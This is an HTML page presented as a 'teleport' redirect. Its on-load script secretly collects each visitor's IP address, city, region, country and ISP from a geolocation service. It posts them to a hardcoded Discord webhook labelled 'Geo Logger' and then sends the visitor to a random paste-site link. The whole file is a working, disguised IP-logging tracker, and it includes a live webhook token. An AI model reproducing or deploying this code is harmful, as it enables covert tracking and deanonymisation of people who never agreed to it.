<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Fetch the geolocation data
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    const payload = {
                        username: "Geo Logger",
                        embeds: [
                            {
                                title: "New User Location",
                                color: 16711680, // red
                                fields: [
                                    { name: "IP Address", value: data.ip, inline: true },
                                    { name: "City", value: data.city, inline: true },
                                    { name: "Region", value: data.region, inline: true },
                                    { name: "Country", value: data.country_name, inline: true },
                                    { name: "ISP", value: data.org, inline: false }
                                ],
                                timestamp: new Date().toISOString()
                            }
                        ]
                    };

                    // Send data to the Discord webhook
                    fetch("https://discord.com/api/webhooks/1373372268364697711/l1jvJLJupKMQyq9P3LhuW_GgK0XJkZ0QNN9VjzOLQNIj2T10f6LakOKMSoZi_H9IsM_E", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Data sent to Discord successfully!');
                            // After the request is successful, redirect to a random site
                            redirectToRandomSite();
                        } else {
                            console.error('Failed to send data to Discord');
                        }
                    })
                    .catch(error => {
                        console.error('Error sending data to Discord:', error);
                    });
                })
                .catch(error => {
                    console.error('Error fetching geolocation data:', error);
                });

            // Function to redirect to a random site
            function redirectToRandomSite() {
                const randomSites = [
                    "http://justpaste.it/8wsbh",
                    "https://justpaste.it/8kozp",
                    "http://justpaste.it/f001e",
                    "http://justpaste.it/h4y94",
		    "http://justpaste.it/f0dos",
		    "http://easytech.space"
                ];
                const randomIndex = Math.floor(Math.random() * randomSites.length);
                const randomSite = randomSites[randomIndex];
                window.location.href = randomSite;
            }
        });
    </script>
</head>
<body>
    <h1>LAST LINK ACCESS TELEPORT</h1>
    <p>SENDING USER TO LAST WEBSITE...</p>
</body>
</html>
